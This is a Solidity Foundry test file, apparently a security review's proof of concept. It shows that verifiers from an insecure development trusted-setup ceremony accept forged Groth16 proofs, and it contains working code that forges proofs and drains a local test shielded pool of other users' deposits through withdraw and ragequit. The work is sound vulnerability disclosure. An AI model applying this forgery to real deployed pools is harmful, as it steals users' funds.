// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {WithdrawVerifier} from "pool-circuits-verifiers/WithdrawVerifier.sol";
import {RagequitVerifier} from "pool-circuits-verifiers/RagequitVerifier.sol";

import {GhostPayAssociationSetRegistry} from "../src/GhostPayAssociationSetRegistry.sol";
import {GhostPayShieldedPoolERC20} from "../src/GhostPayShieldedPoolERC20.sol";
import {IERC5564Announcer} from "../src/interfaces/IERC5564Announcer.sol";
import {
    IGhostPayAssociationSetRegistry
} from "../src/interfaces/IGhostPayAssociationSetRegistry.sol";
import {IGhostPayShieldedPool} from "../src/interfaces/IGhostPayShieldedPool.sol";
import {IWithdrawVerifier, IRagequitVerifier} from "../src/interfaces/IGroth16Verifier.sol";
import {IPoseidonT3, IPoseidonT4} from "../src/interfaces/IPoseidon.sol";

import {MockERC20} from "./mocks/MockERC20.sol";
import {ERC5564Announcer} from "./utils/ERC5564Announcer.sol";
import {PoseidonDeployer} from "./utils/PoseidonDeployer.sol";

/// Independent review PoC: the INSECURE DEV CEREMONY verifiers are forgeable by anyone.
///
/// `scripts/ceremony-dev.sh` (default mode) runs `powersoftau new` (all scalars 1), a public beacon,
/// `groth16 setup` (delta = 1) and a public `zkey beacon`. The phase-2 delta is therefore
/// `Fr.fromRng(rngFromBeaconParams(0x0102..1f20, 10))`, which anyone can recompute with snarkjs'
/// own `misc.js` (checked: `delta * G2 == vk_delta_2` of both vkeys). snarkjs fixes gamma = G2
/// generator. With A = alpha1, B = beta2 the Groth16 equation reduces to
/// `e(vk_x, g2) * e(C, delta2) = 1`, so `C = -(1/delta) * vk_x` verifies for ANY public signals.
/// No alpha/beta/tau knowledge is needed. This test forges proofs on-chain (ecAdd/ecMul
/// precompiles) and drains a pool that holds other users' deposits, via withdraw and via ragequit.
contract ForgedProofTest is Test, PoseidonDeployer {
    uint256 internal constant R =
        21_888_242_871_839_275_222_246_405_745_257_275_088_548_364_400_416_034_343_698_204_186_575_808_495_617;
    /// 1/delta mod r, derived from the public beacon (see contract doc).
    uint256 internal constant DELTA_INV =
        5_674_381_919_129_187_084_567_551_004_170_257_604_286_240_062_765_322_015_334_497_087_195_187_288_080;

    // vk_alpha_1 and vk_beta_2 (shared by both vkeys: same phase 1); beta in calldata (swapped) order.
    uint256 internal constant ALPHA_X =
        6_077_488_231_958_058_972_588_980_013_271_242_599_141_166_881_566_881_278_413_635_666_412_295_191_656;
    uint256 internal constant ALPHA_Y =
        17_407_394_709_551_590_247_504_303_045_583_968_627_630_501_765_985_761_352_638_292_649_802_597_447_560;
    uint256 internal constant BETA_X1 =
        16_942_927_239_554_854_699_333_211_577_201_087_702_800_994_466_006_212_199_228_726_976_162_425_606_700;
    uint256 internal constant BETA_X0 =
        10_062_842_982_317_368_594_079_206_851_337_394_335_601_971_516_644_673_758_401_139_138_017_338_503_756;
    uint256 internal constant BETA_Y1 =
        17_918_428_901_852_111_159_943_360_231_837_167_882_695_780_218_520_001_337_375_502_592_542_112_927_075;
    uint256 internal constant BETA_Y0 =
        1_907_370_830_794_180_128_666_757_545_461_745_391_887_360_236_193_688_070_410_199_810_930_866_641_030;

    address internal constant THIEF = 0x000000000000000000000000000000000000bEEF;

    WithdrawVerifier internal wv;
    RagequitVerifier internal rv;
    MockERC20 internal token;
    GhostPayShieldedPoolERC20 internal pool;
    uint256[2][10] internal icW;
    uint256[2][5] internal icR;

    function setUp() public {
        vm.chainId(31_337);
        vm.warp(1_760_000_000);
        (IPoseidonT3 t3, IPoseidonT4 t4) = deployPoseidon();
        wv = new WithdrawVerifier();
        rv = new RagequitVerifier();
        token = new MockERC20("T", "T", 6);
        pool = new GhostPayShieldedPoolERC20(
            IGhostPayShieldedPool.PoolConfig({
                asset: address(token),
                announcer: IERC5564Announcer(address(new ERC5564Announcer())),
                registry: IGhostPayAssociationSetRegistry(
                    address(new GhostPayAssociationSetRegistry())
                ),
                withdrawVerifier: IWithdrawVerifier(address(wv)),
                ragequitVerifier: IRagequitVerifier(address(rv)),
                poseidonT3: t3,
                poseidonT4: t4,
                denomination: 0,
                maxDeposit: 1e30,
                maxRelayerFeeBps: 500,
                aspGraceSeconds: 600
            })
        );
        _loadIc();
        // Honest users deposit.
        for (uint256 i = 1; i <= 3; ++i) {
            address u = address(uint160(0x1000 + i));
            token.mint(u, 1_000_000);
            vm.startPrank(u);
            token.approve(address(pool), type(uint256).max);
            pool.deposit(1_000_000, 0xabc + i);
            vm.stopPrank();
        }
    }

    /// Withdraw with a forged proof: fresh nullifier, whole pool balance, no deposit by the thief.
    function test_forgedWithdrawDrainsPool() public {
        uint256 bal = token.balanceOf(address(pool));
        IGhostPayShieldedPool.Withdrawal memory w = IGhostPayShieldedPool.Withdrawal({
            recipient: THIEF,
            relayer: address(0),
            relayerFee: 0,
            feeTo: address(0),
            deadline: block.timestamp + 1,
            aspPublisher: address(0),
            announce: ""
        });
        IGhostPayShieldedPool.WithdrawProof memory p;
        p.pubSignals[0] = 0x1234; // change commitment (any fresh field element)
        p.pubSignals[1] = 0x5678; // nullifier hash (any unused value)
        p.pubSignals[2] = bal;
        p.pubSignals[3] = pool.currentRoot();
        p.pubSignals[4] = pool.currentTreeDepth();
        p.pubSignals[8] = uint256(keccak256(abi.encode(w, pool.SCOPE()))) % R;
        uint256[] memory s = new uint256[](9);
        for (uint256 i; i < 9; ++i) {
            s[i] = p.pubSignals[i];
        }
        (p.pA, p.pB, p.pC) = _forge(s, true);
        assertTrue(wv.verifyProof(p.pA, p.pB, p.pC, p.pubSignals), "forged withdraw verifies");
        vm.prank(THIEF);
        pool.withdraw(w, p);
        assertEq(token.balanceOf(THIEF), bal);
        assertEq(token.balanceOf(address(pool)), 0);
    }

    /// Ragequit with a forged proof: thief deposits 1 unit, then claims the whole pool for its label.
    function test_forgedRagequitDrainsPool() public {
        token.mint(THIEF, 1);
        vm.startPrank(THIEF);
        token.approve(address(pool), 1);
        (uint256 c, uint256 label) = pool.deposit(1, 0x77);
        vm.stopPrank();
        uint256 bal = token.balanceOf(address(pool));
        IGhostPayShieldedPool.RagequitProof memory p;
        p.pubSignals = [c, 0x9999, bal, label];
        uint256[] memory s = new uint256[](4);
        for (uint256 i; i < 4; ++i) {
            s[i] = p.pubSignals[i];
        }
        (p.pA, p.pB, p.pC) = _forge(s, false);
        vm.prank(THIEF);
        pool.ragequit(p);
        assertEq(token.balanceOf(THIEF), bal);
        assertEq(token.balanceOf(address(pool)), 0);
    }

    function _forge(uint256[] memory s, bool withdraw_)
        internal
        view
        returns (uint256[2] memory a, uint256[2][2] memory b, uint256[2] memory c)
    {
        uint256[2] memory vkx = withdraw_ ? icW[0] : icR[0];
        for (uint256 i; i < s.length; ++i) {
            uint256[2] memory ic = withdraw_ ? icW[i + 1] : icR[i + 1];
            vkx = _add(vkx, _mul(ic, s[i]));
        }
        a = [ALPHA_X, ALPHA_Y];
        b = [[BETA_X1, BETA_X0], [BETA_Y1, BETA_Y0]];
        c = _mul(vkx, R - DELTA_INV);
    }

    function _add(uint256[2] memory p, uint256[2] memory q)
        internal
        view
        returns (uint256[2] memory r)
    {
        (bool ok, bytes memory out) = address(6).staticcall(abi.encode(p[0], p[1], q[0], q[1]));
        require(ok, "ecAdd");
        r = abi.decode(out, (uint256[2]));
    }

    function _mul(uint256[2] memory p, uint256 k) internal view returns (uint256[2] memory r) {
        (bool ok, bytes memory out) = address(7).staticcall(abi.encode(p[0], p[1], k));
        require(ok, "ecMul");
        r = abi.decode(out, (uint256[2]));
    }

    function _loadIc() internal {
        icW[0] = [
            uint256(
                1_978_183_662_988_980_906_318_940_171_449_859_004_174_676_561_354_762_244_332_897_194_945_931_285_985
            ),
            17_070_835_068_866_281_000_679_765_759_153_521_223_107_416_185_027_425_096_990_408_176_438_630_001_493
        ];
        icW[1] = [
            uint256(
                7_671_246_515_133_347_313_366_793_229_972_241_638_594_833_647_932_332_930_633_978_017_460_878_205_029
            ),
            6_043_752_166_806_484_949_900_123_684_609_312_996_018_368_807_056_530_237_563_068_388_350_597_383_139
        ];
        icW[2] = [
            uint256(
                8_321_545_230_767_639_746_670_674_828_462_697_810_863_142_994_539_100_455_206_377_105_809_473_745_500
            ),
            13_053_600_499_305_964_191_670_298_584_131_273_908_177_029_317_038_568_786_989_545_510_000_153_733_785
        ];
        icW[3] = [
            uint256(
                2_290_204_908_316_842_280_749_690_750_989_342_942_587_438_155_374_885_156_345_445_214_724_436_010_271
            ),
            10_802_352_702_535_017_146_253_440_192_335_132_450_713_318_413_641_700_810_350_202_194_661_559_075_141
        ];
        icW[4] = [
            uint256(
                14_146_038_712_854_149_671_899_855_004_880_019_734_866_611_121_124_332_581_453_328_609_422_491_266_063
            ),
            19_577_633_936_688_170_189_890_843_091_062_326_425_884_258_341_546_788_695_345_284_478_732_239_654_216
        ];
        icW[5] = [
            uint256(
                10_334_159_493_994_235_634_678_630_925_211_532_387_396_212_392_327_550_290_905_539_374_485_676_741_589
            ),
            5_573_978_387_279_451_564_867_725_063_784_392_321_569_617_518_416_569_534_725_125_141_134_440_473_826
        ];
        icW[6] = [
            uint256(
                1_846_022_342_884_573_617_427_621_972_620_894_764_682_031_385_793_082_924_776_489_423_622_529_568_924
            ),
            19_832_095_608_839_183_559_626_200_430_133_741_018_991_654_011_904_937_645_950_268_384_748_169_250_717
        ];
        icW[7] = [
            uint256(
                17_320_161_651_321_634_036_271_443_528_399_426_253_889_927_992_520_613_851_448_975_573_903_107_029_211
            ),
            8_334_823_664_562_763_166_144_653_155_258_748_082_139_364_775_655_926_729_567_558_380_804_106_610_797
        ];
        icW[8] = [
            uint256(
                11_454_396_521_495_139_513_022_440_251_407_812_396_528_002_303_269_861_986_737_721_080_001_455_065_420
            ),
            16_110_837_725_965_795_139_370_050_159_873_809_460_405_436_117_561_808_838_258_482_431_536_011_058_548
        ];
        icW[9] = [
            uint256(
                17_416_566_431_844_642_681_455_728_892_605_312_884_431_842_030_651_377_614_854_186_126_808_092_680_117
            ),
            8_054_835_128_525_128_445_720_867_221_979_165_732_499_924_881_450_690_269_172_429_641_548_280_304_876
        ];
        icR[0] = [
            uint256(
                21_686_264_298_493_644_142_010_545_235_667_800_077_687_675_835_051_334_148_775_621_156_401_548_063_217
            ),
            21_140_996_666_743_182_241_211_536_158_658_222_970_184_057_577_710_227_685_589_027_168_482_975_117_444
        ];
        icR[1] = [
            uint256(
                18_321_159_861_110_874_621_659_206_690_052_171_934_910_842_820_307_684_738_979_784_544_871_120_701_844
            ),
            4_486_016_443_482_911_293_504_745_854_979_374_339_963_250_681_702_417_887_802_523_051_063_872_723_907
        ];
        icR[2] = [
            uint256(
                14_713_467_116_017_581_654_062_827_783_068_219_980_735_514_108_221_897_045_660_862_754_646_801_220_899
            ),
            8_197_928_938_632_249_244_746_368_091_399_454_215_845_828_330_443_321_931_143_918_236_249_530_822_592
        ];
        icR[3] = [
            uint256(
                999_216_617_598_384_983_709_889_776_016_262_592_755_418_708_224_382_976_371_930_513_338_030_871_986
            ),
            18_764_634_374_282_893_880_782_700_360_490_184_547_242_924_524_637_987_959_007_826_130_452_233_888_104
        ];
        icR[4] = [
            uint256(
                16_962_853_133_228_175_236_092_526_855_953_175_024_433_845_139_851_155_873_552_656_303_259_666_249_908
            ),
            13_491_751_495_630_866_283_982_720_120_722_138_835_221_919_024_056_051_302_853_432_482_216_894_304_125
        ];
    }
}
